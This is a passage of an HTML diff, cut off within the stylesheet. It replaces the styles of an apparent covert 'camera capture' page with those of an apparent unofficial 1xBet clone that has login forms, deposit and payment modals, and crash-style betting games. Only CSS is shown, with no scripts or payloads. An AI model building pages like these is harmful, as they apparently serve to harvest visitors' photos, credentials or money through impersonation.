@@ -3,625 +3,2406 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقع التقاط الصور - Blood Theme</title>
+    <title>1xBet - النسخة المتميزة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* Reset and Base Styles */
+        :root {
+            --primary-color: #c41e3a;
+            --secondary-color: #ffcc00;
+            --dark-bg: #0a0a0a;
+            --darker-bg: #1a1a1a;
+            --light-text: #ffffff;
+            --dark-text: #1a1a1a;
+            --error-color: #ff3333;
+            --success-color: #0e8a3e;
+            --warning-color: #ffcc00;
+            --border-radius: 8px;
+            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            --transition: all 0.3s ease;
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        :root {
-            --primary-color: #8b0000;
-            --secondary-color: #b22222;
-            --dark-color: #330000;
-            --light-color: #fff5f5;
-            --accent-color: #ff6b6b;
+            font-family: 'Tajawal', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, var(--dark-color) 0%, #5a0000 100%);
-            color: var(--light-color);
+            background: linear-gradient(135deg, var(--dark-bg) 0%, var(--darker-bg) 100%);
+            color: var(--light-text);
             min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
+            line-height: 1.6;
         }
         
-        /* تأثيرات دموية في الخلفية */
-        .blood-bg {
-            position: fixed;
+        /* Login Page Styles */
+        .login-page {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: url('https://images.unsplash.com/photo-1635070041078-e363dbe005cb?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80') no-repeat center center;
+            background-size: cover;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-page::before {
+            content: '';
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
-            opacity: 0.7;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 1;
         }
         
-        .blood-drop {
-            position: absolute;
-            background: radial-gradient(circle, var(--primary-color) 0%, transparent 70%);
-            border-radius: 50%;
-            animation: drip 15s infinite linear;
-        }
-        
-        @keyframes drip {
-            0% {
-                transform: translateY(-100px) scale(0.5);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.7;
-            }
-            90% {
-                opacity: 0.5;
-            }
-            100% {
-                transform: translateY(100vh) scale(1.2);
-                opacity: 0;
-            }
-        }
-        
-        .container {
-            max-width: 1200px;
+        .login-container {
+            position: relative;
+            z-index: 2;
             width: 100%;
-            margin: 0 auto;
-            padding: 20px;
+            max-width: 450px;
+            padding: 0 20px;
         }
         
-        header {
+        .login-logo {
             text-align: center;
-            padding: 30px 0;
-            position: relative;
-        }
-        
-        h1 {
-            font-size: 3rem;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.7);
-            color: var(--light-color);
-            position: relative;
-            display: inline-block;
-        }
-        
-        h1::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 10%;
-            width: 80%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
-        }
-        
-        .tagline {
-            font-size: 1.2rem;
             margin-bottom: 30px;
-            opacity: 0.9;
+            animation: bounce 2s infinite;
         }
         
-        .sections-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
+        .login-logo img {
+            width: 180px;
+            height: auto;
+            filter: drop-shadow(0 0 10px rgba(196, 30, 58, 0.7));
         }
         
-        .section {
-            background: rgba(51, 0, 0, 0.7);
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(139, 0, 0, 0.3);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        .login-form {
+            background: rgba(26, 26, 26, 0.95);
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            border: 1px solid var(--primary-color);
+            animation: fadeIn 0.5s ease-out;
+            backdrop-filter: blur(5px);
         }
         
-        .section:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+        .register-form {
+            display: none;
         }
         
-        .section-title {
-            font-size: 1.8rem;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .form-title {
+            color: var(--secondary-color);
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 26px;
+            font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .input-group {
+            position: relative;
             margin-bottom: 20px;
-            color: var(--accent-color);
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border-radius: var(--border-radius);
+            border: 1px solid #333;
+            background: rgba(51, 51, 51, 0.8);
+            color: var(--light-text);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+        
+        .form-input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(196, 30, 58, 0.3);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 18px;
+        }
+        
+        .form-btn {
+            background: linear-gradient(to right, var(--primary-color), #a51a30);
+            color: var(--light-text);
+            border: none;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: var(--transition);
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(196, 30, 58, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .form-btn:hover {
+            background: linear-gradient(to right, #a51a30, #8b1628);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(196, 30, 58, 0.6);
+        }
+        
+        .form-btn:active {
+            transform: translateY(0);
+        }
+        
+        .form-footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #888;
+            font-size: 14px;
+        }
+        
+        .switch-form {
+            color: var(--secondary-color);
+            cursor: pointer;
+            text-decoration: underline;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+        
+        .switch-form:hover {
+            color: #e6b800;
+        }
+        
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        .particle {
+            position: absolute;
+            background: rgba(196, 30, 58, 0.5);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: float 15s linear infinite;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(100px); opacity: 0; }
+        }
+        
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            border-radius: var(--border-radius);
+            color: white;
+            font-weight: bold;
+            box-shadow: var(--box-shadow);
+            z-index: 1000;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .toast.show {
+            transform: translateX(0);
+        }
+        
+        .toast.success {
+            background-color: var(--success-color);
+        }
+        
+        .toast.error {
+            background-color: var(--error-color);
+        }
+        
+        .toast.warning {
+            background-color: var(--warning-color);
+            color: var(--dark-text);
+        }
+        
+        /* Main App Styles */
+        .app-container {
+            display: none;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        
+        /* Header Styles */
+        .app-header {
+            background: linear-gradient(to right, var(--dark-bg), var(--primary-color));
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.5);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .header-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .header-logo i {
+            color: var(--secondary-color);
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--secondary-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: var(--dark-text);
+            font-size: 18px;
+        }
+        
+        .username {
+            font-weight: bold;
+        }
+        
+        .balance-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .balance {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 15px;
+            border-radius: var(--border-radius);
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .balance-icon {
+            color: var(--secondary-color);
+        }
+        
+        .action-btn {
+            background: linear-gradient(to right, var(--secondary-color), #e6b800);
+            color: var(--dark-text);
+            border: none;
+            padding: 8px 15px;
+            border-radius: var(--border-radius);
+            font-weight: bold;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .action-btn:hover {
+            background: linear-gradient(to right, #e6b800, #cca300);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(255, 204, 0, 0.3);
+        }
+        
+        .action-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* Main Content Styles */
+        .main-content {
+            padding: 20px;
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+            flex: 1;
+        }
+        
+        .welcome-message {
+            background: linear-gradient(135deg, var(--primary-color) 0%, #a51a30 100%);
+            padding: 20px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            box-shadow: var(--box-shadow);
             text-align: center;
             position: relative;
-            padding-bottom: 10px;
+            overflow: hidden;
         }
         
-        .section-title::after {
+        .welcome-message::before {
             content: '';
             position: absolute;
-            bottom: 0;
-            left: 25%;
-            width: 50%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0.1) 0%,
+                rgba(255, 255, 255, 0) 60%
+            );
+            transform: rotate(30deg);
+            pointer-events: none;
+            animation: shine 6s infinite;
         }
         
-        .link-container {
+        @keyframes shine {
+            0% { transform: rotate(30deg) translate(-30%, -30%); }
+            100% { transform: rotate(30deg) translate(30%, 30%); }
+        }
+        
+        .welcome-title {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: var(--secondary-color);
+            position: relative;
+        }
+        
+        .games-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .game-card {
+            background: linear-gradient(135deg, var(--darker-bg) 0%, #2a2a2a 100%);
+            border-radius: var(--border-radius);
+            padding: 20px;
             text-align: center;
-            margin: 20px 0;
-        }
-        
-        .camera-link {
-            display: inline-block;
-            padding: 15px 40px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            color: white;
-            text-decoration: none;
-            border-radius: 50px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(139, 0, 0, 0.5);
-            border: none;
+            box-shadow: var(--box-shadow);
+            transition: var(--transition);
+            border: 1px solid #333;
             cursor: pointer;
             position: relative;
             overflow: hidden;
         }
         
-        .camera-link::before {
+        .game-card::before {
             content: '';
             position: absolute;
             top: 0;
-            left: -100%;
+            left: 0;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
+            height: 5px;
+            background: var(--primary-color);
         }
         
-        .camera-link:hover::before {
-            left: 100%;
+        .game-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            border-color: var(--primary-color);
         }
         
-        .camera-link:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(139, 0, 0, 0.7);
-        }
-        
-        .device-info {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 15px;
-            border-radius: 10px;
+        .game-icon {
+            font-size: 50px;
             margin-bottom: 15px;
+            color: var(--secondary-color);
+            transition: var(--transition);
         }
         
-        .info-item {
-            display: flex;
-            justify-content: space-between;
+        .game-card:hover .game-icon {
+            transform: scale(1.1);
+        }
+        
+        .game-title {
+            color: var(--secondary-color);
             margin-bottom: 10px;
-            padding-bottom: 8px;
-            border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
+            font-size: 20px;
         }
         
-        .info-label {
-            font-weight: bold;
-            color: var(--accent-color);
+        .game-desc {
+            color: #aaa;
+            margin-bottom: 15px;
+            font-size: 14px;
+            min-height: 40px;
         }
         
-        .photos-btn {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+        .game-btn {
+            background: linear-gradient(to right, var(--primary-color), #a51a30);
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 1rem;
+            padding: 12px 20px;
+            border-radius: var(--border-radius);
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 15px;
+            transition: var(--transition);
+            width: 100%;
         }
         
-        .photos-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(139, 0, 0, 0.5);
+        .game-btn:hover {
+            background: linear-gradient(to right, #a51a30, #8b1628);
         }
         
-        .stats-container {
+        /* Modal Styles */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease-out;
+            backdrop-filter: blur(3px);
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, var(--darker-bg) 0%, #2a2a2a 100%);
+            border-radius: var(--border-radius);
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--primary-color);
+            overflow: hidden;
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal-overlay.show .modal-content {
+            transform: scale(1);
+        }
+        
+        .modal-header {
+            background: linear-gradient(to right, var(--primary-color), #a51a30);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-title {
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .close-modal {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        
+        .close-modal:hover {
+            transform: rotate(90deg);
+        }
+        
+        .modal-body {
+            padding: 20px;
+        }
+        
+        .payment-methods {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .payment-method {
+            background: rgba(51, 51, 51, 0.5);
+            border-radius: var(--border-radius);
+            padding: 15px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            border: 1px solid transparent;
+        }
+        
+        .payment-method:hover {
+            background: rgba(51, 51, 51, 0.8);
+        }
+        
+        .payment-method.selected {
+            background: rgba(196, 30, 58, 0.2);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(196, 30, 58, 0.3);
+        }
+        
+        .payment-icon {
+            font-size: 30px;
+            margin-bottom: 5px;
+            color: var(--secondary-color);
+        }
+        
+        .payment-name {
+            font-size: 14px;
+        }
+        
+        .payment-info {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 15px 0;
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        .payment-detail {
+            margin-bottom: 10px;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .payment-number {
+            font-weight: bold;
+            color: var(--secondary-color);
+            direction: ltr;
+            display: inline-block;
+        }
+        
+        .copy-btn {
+            background: rgba(255, 204, 0, 0.2);
+            color: var(--secondary-color);
+            border: none;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-right: 5px;
+            transition: var(--transition);
+        }
+        
+        .copy-btn:hover {
+            background: rgba(255, 204, 0, 0.3);
+        }
+        
+        .amount-input {
+            width: 100%;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            border: 1px solid #333;
+            background: rgba(51, 51, 51, 0.8);
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+            transition: var(--transition);
+            text-align: center;
+        }
+        
+        .amount-input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(196, 30, 58, 0.3);
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        .modal-btn {
+            background: linear-gradient(to right, var(--primary-color), #a51a30);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: var(--transition);
+            margin-top: 10px;
+        }
+        
+        .modal-btn:hover {
+            background: linear-gradient(to right, #a51a30, #8b1628);
+        }
+        
+        .modal-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
+        
+        /* Game Specific Styles */
+        .game-section {
+            display: none;
+            padding: 20px;
+            animation: fadeIn 0.5s ease-out;
+            flex: 1;
+        }
+        
+        /* Plane Game Styles */
+        .plane-game {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
             gap: 15px;
         }
         
-        .stat-item {
+        .game-balance {
             background: rgba(0, 0, 0, 0.3);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        
-        .stat-value {
-            font-size: 2rem;
+            padding: 8px 15px;
+            border-radius: var(--border-radius);
             font-weight: bold;
-            color: var(--accent-color);
-            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
         
-        .stat-label {
-            font-size: 0.9rem;
-            opacity: 0.8;
-        }
-        
-        .captured-photos {
-            display: none;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-        }
-        
-        .photos-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
+        .bet-amount-container {
+            margin: 20px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             gap: 10px;
-            margin-top: 15px;
         }
         
-        .photo-item {
+        .bet-input {
             width: 100%;
-            aspect-ratio: 1;
-            object-fit: cover;
-            border-radius: 8px;
-            border: 2px solid var(--primary-color);
-        }
-        
-        footer {
-            text-align: center;
-            margin-top: 50px;
-            padding: 20px;
-            border-top: 1px solid rgba(139, 0, 0, 0.3);
-            font-size: 0.9rem;
-            opacity: 0.7;
-        }
-        
-        /* أنماط الصفحة الثانية */
-        .camera-page {
-            background: #1a0000;
+            max-width: 250px;
+            padding: 12px;
+            border-radius: var(--border-radius);
+            border: 1px solid #333;
+            background: rgba(51, 51, 51, 0.8);
             color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .loading-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 30px;
+            margin-bottom: 10px;
             text-align: center;
+            font-size: 16px;
         }
         
-        .loading-circle {
-            width: 100px;
-            height: 100px;
-            border: 10px solid rgba(139, 0, 0, 0.3);
-            border-top: 10px solid var(--accent-color);
-            border-radius: 50%;
-            animation: spin 1.5s linear infinite;
-            margin-bottom: 30px;
+        .countdown {
+            font-size: 40px;
+            font-weight: bold;
+            color: var(--secondary-color);
+            margin: 20px 0;
+            height: 60px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .multiplier-container {
+            margin: 30px 0;
+            position: relative;
+            height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         
-        .loading-text {
-            font-size: 1.5rem;
-            margin-bottom: 20px;
+        .multiplier-display {
+            font-size: 60px;
+            font-weight: bold;
+            color: var(--secondary-color);
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+            transition: all 0.1s;
+            position: relative;
+            z-index: 2;
         }
         
-        .completion-message {
+        .plane-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        
+        .plane {
+            position: absolute;
+            left: -100px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 60px;
+            transition: left 0.1s linear;
+            z-index: 3;
+        }
+        
+        .explosion {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 80px;
             display: none;
-            text-align: center;
-            padding: 30px;
+            animation: explode 0.5s ease-out;
+            z-index: 4;
         }
         
-        .success-icon {
-            font-size: 4rem;
-            color: var(--accent-color);
-            margin-bottom: 20px;
+        @keyframes explode {
+            0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+            50% { transform: translate(-50%, -50%) scale(1.5); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+        
+        .multiplier-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            margin: 20px auto;
+            max-width: 600px;
+        }
+        
+        .multiplier-box {
+            background: rgba(51, 51, 51, 0.5);
+            border-radius: var(--border-radius);
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            border: 1px solid transparent;
+        }
+        
+        .multiplier-box:hover {
+            background: rgba(51, 51, 51, 0.8);
+        }
+        
+        .multiplier-box.selected {
+            background: rgba(196, 30, 58, 0.5);
+            border-color: var(--primary-color);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(196, 30, 58, 0.3);
+        }
+        
+        .multiplier-value {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--secondary-color);
+        }
+        
+        .explosion-info {
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: var(--border-radius);
+            border: 1px solid var(--secondary-color);
+            display: none;
+        }
+        
+        .jump-btn {
+            background: linear-gradient(to right, var(--primary-color), #a51a30);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: var(--border-radius);
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 18px;
+            transition: var(--transition);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .jump-btn:hover {
+            background: linear-gradient(to right, #a51a30, #8b1628);
+            transform: translateY(-2px);
+            box-shadow: 0 7px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .jump-btn:active {
+            transform: translateY(0);
+        }
+        
+        .jump-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: rotate(45deg);
+            pointer-events: none;
+            animation: shine 3s infinite;
+        }
+        
+        .jump-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
+        
+        .jump-btn:disabled::after {
+            display: none;
+        }
+        
+        .game-result {
+            font-size: 24px;
+            margin: 30px 0;
+            padding: 20px;
+            border-radius: var(--border-radius);
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+            text-align: center;
+        }
+        
+        .win {
+            background: rgba(14, 138, 62, 0.2);
+            color: var(--success-color);
+            border: 1px solid var(--success-color);
+        }
+        
+        .lose {
+            background: rgba(255, 51, 51, 0.2);
+            color: var(--error-color);
+            border: 1px solid var(--error-color);
         }
         
         .back-btn {
-            display: inline-block;
-            padding: 12px 30px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            background: rgba(51, 51, 51, 0.5);
             color: white;
-            text-decoration: none;
-            border-radius: 50px;
-            font-size: 1rem;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            margin-top: 20px;
+            border: none;
+            padding: 12px 25px;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 20px auto 0;
         }
         
         .back-btn:hover {
+            background: rgba(51, 51, 51, 0.8);
+        }
+        
+        /* Apple Game Styles */
+        .apple-game {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .apple-bet-container {
+            margin: 20px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .apple-prize {
+            font-size: 22px;
+            margin: 20px 0;
+            color: var(--secondary-color);
+            font-weight: bold;
+            padding: 10px 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: var(--border-radius);
+            display: inline-block;
+        }
+        
+        .apple-rows {
+            display: flex;
+            flex-direction: column-reverse;
+            gap: 15px;
+            margin: 30px 0;
+            align-items: center;
+        }
+        
+        .apple-row {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            transition: var(--transition);
+        }
+        
+        .apple-box {
+            width: 70px;
+            height: 70px;
+            background: rgba(51, 51, 51, 0.5);
+            border-radius: var(--border-radius);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            font-size: 30px;
+            transition: var(--transition);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .apple-box:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+        }
+        
+        .apple-box.selected {
+            background: rgba(196, 30, 58, 0.5);
+            border: 2px solid var(--primary-color);
+            transform: scale(1.05);
+        }
+        
+        .apple-box.bad {
+            background: rgba(255, 51, 51, 0.5);
+            border: 2px solid var(--error-color);
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        
+        .current-row {
+            border: 2px solid var(--secondary-color);
+            padding: 5px;
+            border-radius: 15px;
+            background: rgba(255, 204, 0, 0.1);
+        }
+        
+        .cashout-btn {
+            background: linear-gradient(to right, var(--secondary-color), #e6b800);
+            color: var(--dark-text);
+            border: none;
+            padding: 12px 25px;
+            border-radius: var(--border-radius);
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: var(--transition);
+            font-size: 16px;
+        }
+        
+        .cashout-btn:hover {
+            background: linear-gradient(to right, #e6b800, #cca300);
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(139, 0, 0, 0.5);
+        }
+        
+        .cashout-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* Loading Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Processing Styles */
+        .processing-message {
+            background: rgba(0, 0, 0, 0.7);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .processing-content {
+            background: var(--darker-bg);
+            padding: 30px;
+            border-radius: var(--border-radius);
+            text-align: center;
+            max-width: 400px;
+            border: 1px solid var(--primary-color);
+            box-shadow: var(--box-shadow);
+        }
+        
+        .processing-icon {
+            font-size: 50px;
+            color: var(--secondary-color);
+            margin-bottom: 15px;
+        }
+        
+        .processing-text {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+        
+        .processing-details {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 992px) {
+            .multiplier-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .apple-box {
+                width: 60px;
+                height: 60px;
+                font-size: 28px;
+            }
         }
         
         @media (max-width: 768px) {
-            .sections-container {
+            .games-container {
                 grid-template-columns: 1fr;
             }
             
-            h1 {
-                font-size: 2.2rem;
-            }
-            
-            .stats-container {
-                grid-template-columns: 1fr;
-            }
-            
-            .photos-grid {
+            .payment-methods {
                 grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .multiplier-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .apple-box {
+                width: 50px;
+                height: 50px;
+                font-size: 25px;
+            }
+            
+            .multiplier-display {
+                font-size: 40px;
+            }
+            
+            .header-left {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 5px;
+            }
+            
+            .balance-container {
+                flex-wrap: wrap;
+                justify-content: flex-end;
+            }
+            
+            .multiplier-container {
